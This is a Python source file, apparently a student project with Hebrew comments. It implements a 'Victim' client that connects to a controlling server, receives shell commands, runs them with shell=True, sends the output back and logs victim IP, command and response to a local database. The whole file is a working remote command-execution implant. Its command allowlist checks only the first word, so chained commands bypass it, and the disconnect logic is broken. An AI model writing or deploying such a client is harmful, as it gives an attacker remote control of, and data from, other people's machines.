import socket
import subprocess
import sqlite3
import threading


class Victim:
    def __init__(self,host = socket.gethostbyname(socket.gethostname()), port = 5050):
        self.ADDR = (host, port)
        self.IP = host
        self.FORMAT = 'utf-8'
        self.DISCONNECTED_MESSAGE = "stop"
        self.HEADER = 4096
        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client_socket.connect(self.ADDR)
        self.ALLOWED_COMMANDS = [
            "whoami",  # שם המשתמש המחובר
            "hostname",  # שם המחשב
            "ipconfig",  # כתובות IP
            "systeminfo",  # מידע כללי על המערכת
            "tasklist",  # רשימת תהליכים רצים
            "netstat",  # מצב חיבורים ברשת
            "dir",  # תוכן תיקייה
            "cd",  # מעבר בין תיקיות
            "echo",  # הדפסת טקסט
            "type",  # קריאת תוכן של קובץ
            "ver",  # גרסת מערכת הפעלה
            "time",  # שעה
            "date",  # תאריך
            "cls",  # ניקוי מסך
        ]

    def if_command_is_legal(self, command):
        parts = command.strip().split()
        if not parts:
            return False
        cmd = parts[0]
        return cmd in self.ALLOWED_COMMANDS

    def is_it_should_disconnected(self, command):

        output = None

        if command.lower() == self.DISCONNECTED_MESSAGE:
            print("[DISCONNECTED]")
            output = self.DISCONNECTED_MESSAGE

        elif not self.if_command_is_legal(command):
            print("[ILLEGAL COMMAND]")
            output = "[ILLEGAL COMMAND]"

        return output



    def listen_to_server(self):
        command = self.client_socket.recv(self.HEADER).decode(self.FORMAT)
        print(f"[RECV DEBUG] got command: {command}")
        return command


    def commit_command(self,command):

        output = self.is_it_should_disconnected(command)
        if output not in ["[ILLEGAL COMMAND]", "[DISCONNECTED]"]:

            print(f"[COMMAND RECEIVED] {command}")

            try:
                output_bytes = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                output = output_bytes.decode("utf-8", errors="replace")

            except subprocess.CalledProcessError as e:
                output = e.output.decode("utf-8", errors="replace")

            if output == "":
                print("[EMPTY] output is empty")
                output = "[EMPTY] output is empty"



        return output


    def send_command(self,output):


        print(f"[SENDING DEBUG] sending result: {output[:50]}...")

        self.client_socket.sendall(output.encode(self.FORMAT))


    def keeping_in_DB(self, output, command):

        connection = sqlite3.connect("save_commands.db")  # קובץ באותה תיקייה של הקוד
        cursor = connection.cursor()

        cursor.execute("""
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            victim_ip TEXT,
            command TEXT,
            response TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
        """)

        sql = ("""INSERT INTO commands (victim_ip, command, response)
                  VALUES (?, ?, ?)
                  """)

        values = self.IP, command, output

        cursor.execute(sql, values)
        connection.commit()
        connection.close()


    def start(self):

        while True:
            command = self.listen_to_server()

            output = self.commit_command(command)

            self.send_command(output)

            self.keeping_in_DB(output,command)

            if output == "[DISCONNECTED]":
                break


        self.client_socket.close()

if __name__ == "__main__":
    victim = Victim()
    victim.start()












